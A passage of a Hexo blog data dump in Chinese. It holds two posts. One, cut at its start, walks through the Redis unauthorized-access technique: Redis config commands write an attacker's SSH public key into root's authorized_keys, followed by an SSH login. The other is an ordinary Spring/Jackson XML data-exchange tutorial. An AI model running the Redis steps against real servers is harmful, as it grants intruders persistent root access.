AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\\n\"\n\nsave\n```\n\n此时，就已经往authorized_keys文件中写入了公钥\n\n\n\n本地电脑使用命令`ssh -i ~/.ssh/id_rsa root@10.0.2.100`能够登陆服务器，这里-i后面是私钥的路径\n\n\n\n这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh","slug":"redis-vulnerability","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06a001cg0ukpbrknb9s","content":"<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了</p>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><p>在本地电脑中（linux为例）生成无密码的密钥</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -P &apos;&apos;    # 后面直接回车</span><br></pre></td></tr></table></figure>\n\n<p>此时在~/.ssh/下生成两个文件<code>id_rsa</code>和<code>id_rsa.pub</code>，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8</span><br></pre></td></tr></table></figure>\n\n<p>进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\\n)：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /.ssh</span><br><span class=\"line\"></span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\"></span><br><span class=\"line\">set ssh-test &quot;\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\\n&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>此时，就已经往authorized_keys文件中写入了公钥</p>\n<p>本地电脑使用命令<code>ssh -i ~/.ssh/id_rsa root@10.0.2.100</code>能够登陆服务器，这里-i后面是私钥的路径</p>\n<p>这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了</p>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><p>在本地电脑中（linux为例）生成无密码的密钥</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -P &apos;&apos;    # 后面直接回车</span><br></pre></td></tr></table></figure>\n\n<p>此时在~/.ssh/下生成两个文件<code>id_rsa</code>和<code>id_rsa.pub</code>，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8</span><br></pre></td></tr></table></figure>\n\n<p>进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\\n)：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /.ssh</span><br><span class=\"line\"></span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\"></span><br><span class=\"line\">set ssh-test &quot;\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\\n&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>此时，就已经往authorized_keys文件中写入了公钥</p>\n<p>本地电脑使用命令<code>ssh -i ~/.ssh/id_rsa root@10.0.2.100</code>能够登陆服务器，这里-i后面是私钥的路径</p>\n<p>这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh</p>\n"},{"title":"spring基于xml格式数据交换的前后端配置与使用之Jackson方式","date":"2017-08-18T10:19:51.000Z","keywords":"spring, xml, MappingJackson2XmlHttpMessageConverter","rId":"MB-17081802","_content":"\nMappingJackson2XmlHttpMessageConverter方式解析xml（支持注解修改元素别名）配置及代码如下：\n\nxml配置文件中添加converter\n\n```\n<bean class=\"org.springframework.http.converter.xml.MappingJackson2XmlHttpMessageConverter\">\n                <property name=\"supportedMediaTypes\">\n                \t<list>\n                \t\t<value>application/xml;charset=UTF-8</value>\n                \t</list>\n                </property>\n                <property name=\"prettyPrint\" value=\"false\"/>\n            </bean>\n```\n\npom 文件（在原来的基础上添加了jackson-dataformat-xml的依赖，这里jackson为2.8.7版本）\n\n\n```\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-core</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-databind</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-annotations</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.dataformat</groupId>\n\t\t\t<artifactId>jackson-dataformat-xml</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-core</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-databind</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-annotations</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.dataformat</groupId>\n\t\t\t<artifactId>jackson-dataformat-xml</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n```\n\ncontroller文件（这个controller本就是@restcontroller）\n\n```\n@RequestMapping(value = \"txml\", headers = { \"content-type=application/xml;charset=UTF-8\"})\n\tpublic Object testXml(@RequestBody Xml xml) {\n\n                // 这部分主要打印看看，验证request xml方式入参成功\n\t\ttry {\n\t\t\tObjectMapper mapper = new ObjectMapper();\n\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)\n\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);\n\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参\n\t\t} catch (JsonProcessingException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n                // response出参数据\n\t\tTest_DtoOut tdo = new Test_DtoOut();\n\t\ttdo.code = 200;\n\t\ttdo.msg = xml.getToUserName();\n\t\treturn tdo;\n\t}\n```\n\n\n两个出入参dto（只截部分代码）\n\n```\npackage com.mufeng.dto.in;\n\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.annotation.JsonRootName;\n\n@JsonRootName(value=\"out\") // 给xml根节点别名，不然会带包名\npublic class Xml {\n\t@JsonProperty(value=\"toUserName\")// 变量对应的入参数据标签名，这里可以使实现与入参数据标签名不同\n\tString toUserName;\n\t@JsonProperty(value=\"fromUserName\")\n\tString fromUserName;\n\t@JsonProperty(value=\"CreateTime\")\n\tLong createTime;\n\t@JsonProperty(value=\"MsgType\")\n\tString msgType;\n\t@JsonProperty(value=\"Event\")\n\tString event;\n```\n\n\n```\npackage com.mufeng.dto.out;\n\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.annotation.JsonRootName;\nimport com.fasterxml.jackson.dataformat.xml.annotation.JacksonXmlRootElement;\n\n//@JacksonXmlRootElement(localName=\"out\")\n@JsonRootName(value=\"out\")\npublic class Test_DtoOut {\n\n\t@JsonProperty(value=\"codes\")\n\tpublic Integer code;\n        // 不给别名xml数据默认的标签名与属性名一致\n\tpublic String msg;\n```\n\n前端文件html（注意前端代码要放到服务器上，浏览器输入url，否则contentType不会起作用）\n```\n<html>  \n<head>  \n<meta http-equiv=\"Content-Type\" content=\"application/xml; charset=UTF-8\">  \n<title>测试接收XML格式的数据</title>  \n<script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-1.12.4.js\"></script>  \n<!-- <script type=\"text/javascript\" src=\"js/json2.js\"></script>  -->\n<script type=\"text/javascript\">  \n$(document).ready(function(){  \n    sendxml();  \n});  \n  \nfunction sendxml(){  \n    var xmlData = \"<out><toUserName>toUser</toUserName><fromUserName>FromUser</fromUserName><CreateTime>123456789</CreateTime><MsgType>event</MsgType><Event>subscribe</Event></out>\";\n   \n\t$.ajax({\n            type: \"POST\",\n            url: \"http://localhost:8080/valida/webctrl/demo/txml\",\n                \n                // data sent is xml\n\t\t\t\tcontentType: \"application/xml; charset=utf-8\",\n                data: xmlData, \n                // data in response will expected xml\n                dataType: \"xml\",\n\t\t\t\tprocessData: false,\n                anysc: false,\n\t\t\t\tbeforeSend: function(request) {\n\t\t\t\t\t\t\n                       request.setRequestHeader('Access-Control-Allow-Origin: *');\n\t\t\t\t\t   request.setRequestHeader('Access-Control-Allow-Methods: POST,GET,OPTIONS');\n\t\t\t\t\t   request.overrideMimeType('application/xml; charset=utf-8')\n\t\t\t\t\t   console.log(JSON.stringify(request));\n                 },\n                success: function (result) { \n\t\t\t\t\tconsole.log(result);\n                },\n                error: function (XMLHttpRequest, textStatus, errorThrown) {\n                    alert(errorThrown + ':' + textStatus); // 错误处理\n                }\n            });\n\t\t\n}  \n</script>  \n</head>  \n<body>  \n</body>  \n</html>  \n```\n\n\n后端控制台打印\n```\n{\"toUserName\":\"toUser\",\"fromUserName\":\"FromUser\",\"CreateTime\":123456789,\"MsgType\":\"event\",\"Event\":\"subscribe\"}\n```\n前端接收到返回值\n\n```\n<out><msg>toUser</msg><codes>200</codes></out>\n```\n\n\n\n另外一种使用xstream实现xml数据交换的配置，详见另一篇博客\n[spring基于xml格式数据交换的前后端配置与使用之xstream方式](./2017-08-18_spring_xml_xstream.md)\n\n","source":"_posts/2017-08-18_spring_xml_jackson.md","raw":"---\ntitle: spring基于xml格式数据交换的前后端配置与使用之Jackson方式\ndate: 2017-08-18 18:19:51\ntags: spring\npermalink: spring-xml-jackson\nkeywords: spring, xml, MappingJackson2XmlHttpMessageConverter\nrId: MB-17081802\n---\n\nMappingJackson2XmlHttpMessageConverter方式解析xml（支持注解修改元素别名）配置及代码如下：\n\nxml配置文件中添加converter\n\n```\n<bean class=\"org.springframework.http.converter.xml.MappingJackson2XmlHttpMessageConverter\">\n                <property name=\"supportedMediaTypes\">\n                \t<list>\n                \t\t<value>application/xml;charset=UTF-8</value>\n                \t</list>\n                </property>\n                <property name=\"prettyPrint\" value=\"false\"/>\n            </bean>\n```\n\npom 文件（在原来的基础上添加了jackson-dataformat-xml的依赖，这里jackson为2.8.7版本）\n\n\n```\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-core</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-databind</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-annotations</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.dataformat</groupId>\n\t\t\t<artifactId>jackson-dataformat-xml</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-core</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-databind</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-annotations</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.dataformat</groupId>\n\t\t\t<artifactId>jackson-dataformat-xml</artifactId>\n\t\t\t<version>${jackson.version}</version>\n\t\t</dependency>\n```\n\ncontroller文件（这个controller本就是@restcontroller）\n\n```\n@RequestMapping(value = \"txml\", headers = { \"content-type=application/xml;charset=UTF-8\"})\n\tpublic Object testXml(@RequestBody Xml xml) {\n\n                // 这部分主要打印看看，验证request xml方式入参成功\n\t\ttry {\n\t\t\tObjectMapper mapper = new ObjectMapper();\n\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)\n\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);\n\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参\n\t\t} catch (JsonProcessingException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n                // response出参数据\n\t\tTest_DtoOut tdo = new Test_DtoOut();\n\t\ttdo.code = 200;\n\t\ttdo.msg = xml.getToUserName();\n\t\treturn tdo;\n\t}\n```\n\n\n两个出入参dto（只截部分代码）\n\n```\npackage com.mufeng.dto.in;\n\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.annotation.JsonRootName;\n\n@JsonRootName(value=\"out\") // 给xml根节点别名，不然会带包名\npublic class Xml {\n\t@JsonProperty(value=\"toUserName\")// 变量对应的入参数据标签名，这里可以使实现与入参数据标签名不同\n\tString toUserName;\n\t@JsonProperty(value=\"fromUserName\")\n\tString fromUserName;\n\t@JsonProperty(value=\"CreateTime\")\n\tLong createTime;\n\t@JsonProperty(value=\"MsgType\")\n\tString msgType;\n\t@JsonProperty(value=\"Event\")\n\tString event;\n```\n\n\n```\npackage com.mufeng.dto.out;\n\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.annotation.JsonRootName;\nimport com.fasterxml.jackson.dataformat.xml.annotation.JacksonXmlRootElement;\n\n//@JacksonXmlRootElement(localName=\"out\")\n@JsonRootName(value=\"out\")\npublic class Test_DtoOut {\n\n\t@JsonProperty(value=\"codes\")\n\tpublic Integer code;\n        // 不给别名xml数据默认的标签名与属性名一致\n\tpublic String msg;\n```\n\n前端文件html（注意前端代码要放到服务器上，浏览器输入url，否则contentType不会起作用）\n```\n<html>  \n<head>  \n<meta http-equiv=\"Content-Type\" content=\"application/xml; charset=UTF-8\">  \n<title>测试接收XML格式的数据</title>  \n<script type=\"text/javascript\" src=\"https://code.jquery.com/jquery-1.12.4.js\"></script>  \n<!-- <script type=\"text/javascript\" src=\"js/json2.js\"></script>  -->\n<script type=\"text/javascript\">  \n$(document).ready(function(){  \n    sendxml();  \n});  \n  \nfunction sendxml(){  \n    var xmlData = \"<out><toUserName>toUser</toUserName><fromUserName>FromUser</fromUserName><CreateTime>123456789</CreateTime><MsgType>event</MsgType><Event>subscribe</Event></out>\";\n   \n\t$.ajax({\n            type: \"POST\",\n            url: \"http://localhost:8080/valida/webctrl/demo/txml\",\n                \n                // data sent is xml\n\t\t\t\tcontentType: \"application/xml; charset=utf-8\",\n                data: xmlData, \n                // data in response will expected xml\n                dataType: \"xml\",\n\t\t\t\tprocessData: false,\n                anysc: false,\n\t\t\t\tbeforeSend: function(request) {\n\t\t\t\t\t\t\n                       request.setRequestHeader('Access-Control-Allow-Origin: *');\n\t\t\t\t\t   request.setRequestHeader('Access-Control-Allow-Methods: POST,GET,OPTIONS');\n\t\t\t\t\t   request.overrideMimeType('application/xml; charset=utf-8')\n\t\t\t\t\t   console.log(JSON.stringify(request));\n                 },\n                success: function (result) { \n\t\t\t\t\tconsole.log(result);\n                },\n                error: function (XMLHttpRequest, textStatus, errorThrown) {\n                    alert(errorThrown + ':' + textStatus); // 错误处理\n                }\n            });\n\t\t\n}  \n</script>  \n</head>  \n<body>  \n</body>  \n</html>  \n```\n\n\n后端控制台打印\n```\n{\"toUserName\":\"toUser\",\"fromUserName\":\"FromUser\",\"CreateTime\":123456789,\"MsgType\":\"event\",\"Event\":\"subscribe\"}\n```\n前端接收到返回值\n\n```\n<out><msg>toUser</msg><codes>200</codes></out>\n```\n\n\n\n另外一种使用xstream实现xml数据交换的配置，详见另一篇博客\n[spring基于xml格式数据交换的前后端配置与使用之xstream方式](./2017-08-18_spring_xml_xstream.md)\n\n","slug":"spring-xml-jackson","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06b001eg0ukqd47g4xe","content":"<p>MappingJackson2XmlHttpMessageConverter方式解析xml（支持注解修改元素别名）配置及代码如下：</p>\n<p>xml配置文件中添加converter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean class=&quot;org.springframework.http.converter.xml.MappingJackson2XmlHttpMessageConverter&quot;&gt;</span><br><span class=\"line\">                &lt;property name=&quot;supportedMediaTypes&quot;&gt;</span><br><span class=\"line\">                \t&lt;list&gt;</span><br><span class=\"line\">                \t\t&lt;value&gt;application/xml;charset=UTF-8&lt;/value&gt;</span><br><span class=\"line\">                \t&lt;/list&gt;</span><br><span class=\"line\">                &lt;/property&gt;</span><br><span class=\"line\">                &lt;property name=&quot;prettyPrint&quot; value=&quot;false&quot;/&gt;</span><br><span class=\"line\">            &lt;/bean&gt;</span><br></pre></td></tr></table></figure>\n\n<p>pom 文件（在原来的基础上添加了jackson-dataformat-xml的依赖，这里jackson为2.8.7版本）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-dataformat-xml&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br><span class=\"line\">\t\t&lt;dependency&gt;</span><br><span class=\"line\">\t\t\t&lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;</span><br><span class=\"line\">\t\t\t&lt;artifactId&gt;jackson-dataformat-xml&lt;/artifactId&gt;</span><br><span class=\"line\">\t\t\t&lt;version&gt;$&#123;jackson.version&#125;&lt;/version&gt;</span><br><span class=\"line\">\t\t&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>controller文件（这个controller本就是@restcontroller）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RequestMapping(value = &quot;txml&quot;, headers = &#123; &quot;content-type=application/xml;charset=UTF-8&quot;&#125;)</span><br><span class=\"line\">\tpublic Object testXml(@RequestBody Xml xml) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                // 这部分主要打印看看，验证request xml方式入参成功</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\tObjectMapper mapper = new ObjectMapper();</span><br><span class=\"line\">\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)</span><br><span class=\"line\">\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);</span><br><span class=\"line\">\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参</span><br><span 